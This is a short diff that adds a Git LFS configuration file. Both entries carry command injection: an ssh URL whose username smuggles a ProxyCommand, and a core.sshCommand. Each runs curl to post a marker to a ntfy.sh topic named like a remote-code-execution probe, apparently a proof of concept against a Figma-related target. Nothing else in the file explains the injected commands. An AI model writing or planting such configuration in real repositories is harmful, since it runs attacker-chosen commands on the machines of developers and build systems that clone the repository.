@@ -1,0 +1,4 @@
+[lfs]
+	url = ssh://-oProxyCommand=sh%20-c%20%22curl%20-s%20-m%208%20-d%20LFS_A1%20https:%2F%2Fntfy.sh%2Frce2-figma-e9a00199af4f9d86%20%3Btrue%22@probe.local/repo
+[core]
+	sshCommand = sh -c "curl -s -m 8 -d LFS_B1 https://ntfy.sh/rce2-figma-e9a00199af4f9d86"
